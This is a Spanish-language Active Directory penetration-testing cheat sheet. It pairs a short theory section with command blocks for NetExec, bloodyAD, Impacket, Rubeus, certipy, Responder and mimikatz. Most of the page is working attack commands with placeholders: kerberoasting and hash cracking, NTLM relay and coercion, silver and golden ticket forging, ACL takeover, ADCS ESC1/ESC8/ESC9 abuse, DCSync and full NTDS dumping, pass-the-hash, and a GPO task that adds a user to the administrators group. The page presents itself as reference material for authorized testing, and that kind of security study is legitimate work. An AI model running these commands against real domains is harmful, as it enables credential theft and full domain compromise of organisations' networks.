# Active Directory

[⬅ Volver al índice](../CHEATSHEET.md) · [Versión web](https://iphobiuss.github.io)

> [!WARNING]
> **Solo entornos autorizados.** Contenido educativo y de referencia, con placeholders genéricos (`corp.local`, `$DC_IP`). No reproduce hosts, flags ni cadenas de ningún examen. Aplicar estas técnicas sin permiso por escrito es ilegal.

## Teoría

Active Directory es el sistema nervioso de casi toda red corporativa Windows: centraliza identidades, autenticación (**Kerberos** y NTLM) y permisos. Rara vez cae por una sola vulnerabilidad; cae por una **cadena** de configuraciones erróneas que, encadenadas, llevan de un usuario sin privilegios a Domain Admin.

El modelo mental es *assume breach*: se parte de un foothold cualquiera (una credencial, un hash, una sesión) y se escala abusando de lo que el dominio permite por diseño mal aplicado — cuentas de servicio kerberoasteables, ACLs delegadas en exceso, delegación de Kerberos, plantillas de certificado (ADCS) débiles y, al final, la replicación (**DCSync**) que entrega los secretos del dominio.

Sobre Kerberos conviene tener claro el modelo de tickets: un **TGT** prueba tu identidad ante el DC, y con él pides un **TGS** para un servicio concreto. Muchos ataques de AD abusan de cómo se emiten, cifran o delegan esos tickets. La herramienta central es **BloodHound**, que convierte ese laberinto de permisos en un grafo de rutas de ataque. Disciplina de oro: **re-enumerar con cada identidad nueva**, porque cada una ve un grafo distinto.

## Herramientas del área

### NetExec (nxc)

**Qué hace** · Ejecución y enumeración multiprotocolo (SMB, LDAP, WinRM, MSSQL, RDP).  

**Cuándo se usa** · La que más uso en AD: shares, kerberoasting, spraying, DPAPI, pass-the-hash.

```bash
nxc ldap $DC_IP -u $USER -p $PASS --kerberoasting out.txt
```
📖 [Documentación](https://github.com/Pennyw0rth/NetExec)

### bloodyAD

**Qué hace** · Lee y modifica objetos de AD (ACLs, atributos, membresías) desde Linux.  

**Cuándo se usa** · Abusar de permisos: GenericAll, WriteSPN, add groupMember, set password, RBCD.

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASS get writable --otype ALL
```
📖 [Documentación](https://github.com/CravateRouge/bloodyAD)

### Impacket

**Qué hace** · Suite de scripts Python para los protocolos de Windows (secretsdump, getST, GetUserSPNs, ticketer, mssqlclient…).  

**Cuándo se usa** · Casi todo en AD: DCSync, delegación, tickets Kerberos, MSSQL remoto.

```bash
secretsdump.py -just-dc-user "$DOMAIN\Administrator" "$DOMAIN/$USER:$PASS@$DC_IP"
```
📖 [Documentación](https://github.com/fortra/impacket)

### Rubeus

**Qué hace** · Manipulación de Kerberos en Windows (monitor, tgtdeleg, asktgt, S4U).  

**Cuándo se usa** · Cosechar TGTs vía delegación/coerción o abusar de S4U.

```bash
Rubeus.exe monitor /interval:5 /nowrap
```
📖 [Documentación](https://github.com/GhostPack/Rubeus)

### certipy-ad

**Qué hace** · Enumera y explota ADCS: plantillas vulnerables, Shadow Credentials, ESC1-ESC9.  

**Cuándo se usa** · Cuando hay una CA en juego o puedes escribir msDS-KeyCredentialLink.

```bash
certipy-ad find -u $USER -p $PASS -dc-ip $DC_IP -vulnerable -stdout
```
📖 [Documentación](https://github.com/ly4k/Certipy)

### Responder + ntlmrelayx

**Qué hace** · Responder envenena LLMNR/NBT-NS para capturar auths; ntlmrelayx las relayea.  

**Cuándo se usa** · Foothold sin credenciales: capturar NTLMv2 o relayear a LDAPS.

```bash
ntlmrelayx.py -t ldaps://$DC_IP --add-computer 'PWN$' 'Pass!'
```
📖 [Documentación](https://github.com/lgandx/Responder)

### mimikatz

**Qué hace** · Extrae credenciales de memoria y secretos de LSA (incluidas trust keys).  

**Cuándo se usa** · Volcar LSASS, claves de confianza inter-forest o pass-the-ticket.

```bash
mimikatz "privilege::debug" "lsadump::trust /patch" "exit"
```
📖 [Documentación](https://github.com/gentilkiwi/mimikatz)

## Comandos por objetivo

### Enumeración SMB & Active Directory

```bash
# recursos compartidos (con credenciales o null session)
nxc smb $IP -u $USER -p $PASS --shares
nxc smb $IP -u '' -p '' --shares
smbmap -H $IP
# usuarios y política de contraseñas del dominio
nxc smb $DC_IP -u $USER -p $PASS --users
nxc smb $DC_IP -u $USER -p $PASS --pass-pol
# recolección para BloodHound
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC_IP -c All --zip
# objetos sobre los que tengo permiso de escritura
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASS get writable --otype ALL
```

### Coerción & NTLM relay

```bash
# envenenamiento LLMNR/NBT-NS
sudo responder -I <iface> -d -w
# relay a LDAPS creando una cuenta de máquina (abuso de MAQ)
ntlmrelayx.py -t ldaps://$DC_IP --add-computer 'PWN$' 'Pwn3d_Pass!'
# coerción por PrinterBug / MS-RPRN (o PetitPotam / MS-EFSR)
SpoolSample.exe $TARGET <listener_ip>
printerbug.py $DOMAIN/$USER:$PASS@$TARGET <listener_ip>
```

### Kerberos: roasting, tickets, delegación

```bash
# Kerberoasting (cuentas con SPN)
nxc ldap $DC_IP -u $USER -p $PASS --kerberoasting kerb.txt
GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USER:$PASS -outputfile kerb.txt
# AS-REP Roasting (cuentas sin preautenticación)
GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP
# craqueo, modos: 13100 TGS · 18200 AS-REP · 5600 NetNTLMv2
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
# TGT inicial + ticket de servicio (S4U)
getTGT.py $DOMAIN/$USER -hashes :<NT_HASH> -dc-ip $DC_IP
export KRB5CCNAME=$USER.ccache
getST.py -spn 'cifs/$TARGET' -impersonate Administrator $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP
# S4U2self + U2U (cuenta sin SPN propio y MAQ=0)
describeTicket.py $USER.ccache | grep -i "session key"
changepasswd.py $DOMAIN/$USER -hashes :<NT_HASH> -newhashes :<SESSION_KEY> -dc-ip $DC_IP
getST.py -u2u -self -impersonate Administrator -altservice 'cifs/$TARGET' $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP
# Silver ticket (offline, con hash de la cuenta de servicio)
ticketer.py -nthash <SVC_HASH> -domain-sid <SID> -domain $DOMAIN -spn MSSQLSvc/$HOST:1433 Administrator
# Golden ticket (persistencia, con hash de krbtgt)
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain $DOMAIN Administrator
```

### Abuso de ACLs en AD

```bash
# tomar control de una cuenta
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASS add genericAll $VICTIM $USER
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASS set password $VICTIM 'Pwn3d_Pass!'
# membresía de grupo (refresca el PAC con un TGT nuevo)
bloodyAD ... add groupMember "$GROUP" $USER
bloodyAD ... get object $USER --attr memberOf
# WriteSPN → kerberoasting dirigido
bloodyAD ... set object $VICTIM servicePrincipalName -v 'HTTP/temp.$DOMAIN'
# UPN swap (ADCS ESC9)
bloodyAD ... set object $VICTIM userPrincipalName -v 'Administrator'
# RBCD (delegación basada en recursos)
bloodyAD ... add rbcd $TARGET$ 'PWN$'
```

### ADCS & delegación

```bash
# descubrir delegación
findDelegation.py $DOMAIN/$USER -hashes :<NT_HASH> -dc-ip $DC_IP
# enumerar plantillas de certificado vulnerables
certipy-ad find -u $USER -p $PASS -dc-ip $DC_IP -vulnerable -stdout
# Shadow Credentials (msDS-KeyCredentialLink)
certipy-ad shadow auto -u $USER@$DOMAIN -p $PASS -account 'DC01$' -target $TARGET -dc-ip $DC_IP
# ESC1: certificado con SAN arbitrario
certipy-ad req -u $USER -p $PASS -ca <CA> -template <VULN> -upn Administrator@$DOMAIN
# ESC8: relay al web enrollment de la CA
certipy-ad relay -target 'http://<CA>/certsrv/certfnsh.asp' -template DomainController
# ESC9 (No Security Extension): swap de UPN de la víctima
certipy-ad account update -u $USER@$DOMAIN -p $PASS -user $VICTIM -upn Administrator
certipy-ad req -u $VICTIM@$DOMAIN -p $VICTIM_PASS -ca <CA> -template <ESC9_TPL>
certipy-ad account update -u $USER@$DOMAIN -p $PASS -user $VICTIM -upn $VICTIM@$DOMAIN
# autenticar con el certificado obtenido
certipy-ad auth -pfx administrator.pfx -dc-ip $DC_IP
```

### DCSync & persistencia de dominio

```bash
# DCSync de una cuenta concreta (más silencioso)
secretsdump.py -hashes :<DC_HASH> -just-dc-user "$DOMAIN\Administrator" "$DOMAIN/DC$@$DC_IP"
# volcado completo del NTDS
secretsdump.py -just-dc "$DOMAIN/$USER:$PASS@$DC_IP"
# pass-the-hash
evil-winrm -i $DC_IP -u Administrator -H <DA_HASH>
nxc smb $DC_IP -u Administrator -H <DA_HASH> -x "whoami"
# abuso de GPO (tarea programada inmediata)
GPOwned.py -u $USER -d $DOMAIN -dc-ip $DC_IP -creategpo -name "GPO"
GPOwned.py ... -gpoimmtask -taskname 'x' -dstpath 'cmd /c net localgroup administrators $USER /add'
```
